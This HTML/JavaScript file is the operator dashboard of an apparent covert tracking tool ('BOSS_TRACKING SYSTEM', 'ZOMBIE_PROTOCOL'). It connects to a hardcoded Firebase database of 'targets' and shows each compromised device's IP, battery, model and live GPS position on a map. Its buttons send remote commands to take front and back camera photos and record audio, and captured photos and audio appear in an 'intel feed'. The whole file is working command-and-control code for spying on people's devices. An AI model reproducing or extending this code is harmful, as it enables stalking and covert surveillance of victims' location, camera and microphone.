<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>BOSS_TRACKING SYSTEM V7.6</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    
    <style>
        :root { --neon: #00ff41; --bg: #050505; --panel: #0d0d0d; --red: #ff3131; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
        
        /* Sidebar */
        .sidebar { width: 300px; border-right: 1px solid #222; background: #000; display: flex; flex-direction: column; }
        .sidebar-header { padding: 20px; border-bottom: 1px solid #222; text-align: center; }
        .node-list { flex: 1; overflow-y: auto; padding: 10px; }
        .node-item { border: 1px solid #222; padding: 15px; margin-bottom: 10px; cursor: pointer; position: relative; transition: 0.3s; }
        .node-item:hover { border-color: var(--neon); background: rgba(0, 255, 65, 0.05); }
        .node-item.active { border-color: var(--neon); background: rgba(0, 255, 65, 0.1); box-shadow: inset 0 0 10px rgba(0,255,65,0.2); }
        
        .status-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; margin-right: 8px; background: #444; }
        .online { background: var(--neon); box-shadow: 0 0 8px var(--neon); }
        .watching-tag { font-size: 9px; color: var(--neon); animation: blink 1s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }

        /* Main Content */
        .main-content { flex: 1; display: flex; flex-direction: column; background: var(--bg); overflow: hidden; }
        .header-bar { padding: 15px 25px; background: var(--panel); border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; }
        
        .controls { padding: 20px; display: flex; flex-wrap: wrap; gap: 10px; background: #0a0a0a; border-bottom: 1px solid #222; }
        .btn { background: transparent; border: 1px solid var(--neon); color: var(--neon); padding: 10px 18px; cursor: pointer; font-family: inherit; font-weight: bold; font-size: 12px; }
        .btn:hover { background: var(--neon); color: #000; box-shadow: 0 0 15px var(--neon); }
        .btn-red { border-color: var(--red); color: var(--red); }

        /* Dashboard Grid */
        .grid { display: grid; grid-template-columns: 1fr 1.2fr; gap: 20px; padding: 20px; overflow-y: auto; }
        .box { background: var(--panel); border: 1px solid #222; padding: 15px; position: relative; }
        .box h3 { margin-top: 0; font-size: 14px; border-bottom: 1px solid #222; padding-bottom: 10px; color: #aaa; text-transform: uppercase; }

        /* Map Fix */
        #map-container { width: 100%; height: 250px; border: 1px solid #333; background: #000; margin-top: 10px; border-radius: 4px; }
        .leaflet-container { filter: invert(90%) hue-rotate(180deg) brightness(1.2); } /* Dark Mode Map */

        .feed { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 15px; }
        .media-card { background: #000; border: 1px solid #222; padding: 5px; text-align: center; }
        .media-card img { width: 100%; border: 1px solid #111; }
        
        .del-btn { color: var(--red); cursor: pointer; background: none; border: 1px solid #444; font-size: 10px; padding: 2px 5px; margin-top: 5px; }
        .protocol-red { color: var(--red); font-weight: bold; text-shadow: 0 0 5px var(--red); }
    </style>
</head>
<body>

    <div class="sidebar"> 
        <div class="node-item ${selectedNode == id ? 'active' : ''}" onclick="selectNode('${id}')">
        <span class="status-dot ${isOnline ? 'online' : ''}"></span>
        <strong>${data.info?.customName || id}</strong><br> <small style="color:#666; font-size:9px;">${data.info?.ip || ''}</small>
    </div>`;
        <div class="sidebar-header">
            <h2 style="margin:0; color:var(--neon); font-size:18px;">BOSS_V7 <span class="protocol-red" style="font-size:10px;">SRV_2285</span></h2>
            <small class="protocol-red">ZOMBIE_PROTOCOL_ACTIVE</small>
        </div>
        <div class="node-list" id="node-list"></div>
    </div>

    <div class="main-content" id="main-ui" style="display:none;">
        <div class="header-bar">
            <h3 id="active-target-id" style="margin:0; font-size:16px;">SELECT NODE</h3>
            <div id="status-info" style="font-size: 11px; color: #888;"></div>
        </div>

        <div class="controls">
            <button class="btn" onclick="sendCommand('photo')">üì∏ FRONT CAPTURE</button>
            <button class="btn" onclick="sendCommand('back')">üì∏ BACK CAPTURE</button>
            <button class="btn" onclick="sendCommand('audio')">üéôÔ∏è RECORD AUDIO</button>
            <button class="btn btn-red" onclick="wipeTargetData()">üíÄ WIPE NODE DATA</button>
        </div>

        <div class="grid">
            <div class="box">
                <h3>üìç LIVE_LOCATION</h3>
                <div id="map-container"></div>
                <div id="loc-data" style="font-size: 11px; margin-top: 10px; color: var(--neon);">COORDS: Waiting...</div>
            </div>
            <div class="box">
                <h3>‚öôÔ∏è SYSTEM_LOGS</h3>
                <div id="log-content" style="font-size: 12px; line-height: 1.6;"></div>
            </div>
            <div class="box" style="grid-column: span 2;">
                <h3>üìÅ INTEL_FEED (Photos & Audio)</h3>
                <div class="feed" id="intel-feed"></div>
            </div>
        </div>
    </div>

<script>
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    
    let selectedNode = null;
    let map, marker;

    // --- NODE LIST SYNC ---
    db.ref('targets').on('value', snap => {
        const list = document.getElementById('node-list');
        list.innerHTML = "";
        snap.forEach(child => {
            const id = child.key;
            const data = child.val();
            const isOnline = data.info?.status === "ONLINE";
            
            list.innerHTML += `
                <div class="node-item ${selectedNode == id ? 'active' : ''}" onclick="selectNode('${id}')">
                    <span class="status-dot ${isOnline ? 'online' : ''}"></span>
                    <strong>${data.customName || id}</strong><br>
                    ${isOnline ? '<span class="watching-tag">WATCHING_VIDEO</span>' : ''}
                    <button class="del-btn" style="float:right;" onclick="event.stopPropagation(); deleteNode('${id}')">X</button>
                </div>`;
        });
    });

    function selectNode(id) {
        selectedNode = id;
        document.getElementById('main-ui').style.display = 'flex';
        document.getElementById('active-target-id').innerText = id;

        db.ref(`targets/${id}`).on('value', s => {
            const data = s.val() || {};
            
            // Update Logs
            const info = data.info || {};
            document.getElementById('log-content').innerHTML = `
                IP_ADDRESS: <span style="color:#fff;">${info.ip || '---'}</span><br>
                BATTERY: <span style="color:#fff;">${info.battery || '---'}</span><br>
                DEVICE: <span style="color:#fff;">${info.device || '---'}</span><br>
                LAST_ACTIVITY: <span style="color:#fff;">${info.time || '---'}</span>
            `;

            // Update Map
            if(data.location) {
                updateMap(data.location.lat, data.location.lng);
                document.getElementById('loc-data').innerText = `COORDS: ${data.location.lat.toFixed(5)}, ${data.location.lng.toFixed(5)}`;
            }

            // Update Intel Feed
            const feed = document.getElementById('intel-feed');
            feed.innerHTML = "";
            if(data.photos) {
                Object.entries(data.photos).reverse().forEach(([k, p]) => {
                    feed.innerHTML += `<div class="media-card"><img src="${p.img}"><br><small>${p.type}</small></div>`;
                });
            }
            if(data.audios) {
                Object.entries(data.audios).reverse().forEach(([k, a]) => {
                    feed.innerHTML += `<div class="media-card" style="padding:10px;"><audio src="${a.data}" controls style="width:100%;"></audio></div>`;
                });
            }
        });
    }

    function updateMap(lat, lng) {
        if (!map) {
            map = L.map('map-container').setView([lat, lng], 15);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
            marker = L.marker([lat, lng]).addTo(map);
        } else {
            map.setView([lat, lng]);
            marker.setLatLng([lat, lng]);
        }
    }

    function sendCommand(act) {
        if(!selectedNode) return;
        db.ref(`commands/${selectedNode}`).set({ action: act, ts: Date.now() });
        alert("COMMAND_SENT: " + act.toUpperCase());
    }

    function deleteNode(id) {
        if(confirm("Confirm Delete Node?")) db.ref(`targets/${id}`).remove();
    }

    function wipeTargetData() {
        if(confirm("WIPE ALL DATA?")) {
            db.ref(`targets/${selectedNode}`).remove();
            document.getElementById('main-ui').style.display = 'none';
        }
    }
</script>
</body>
</html>
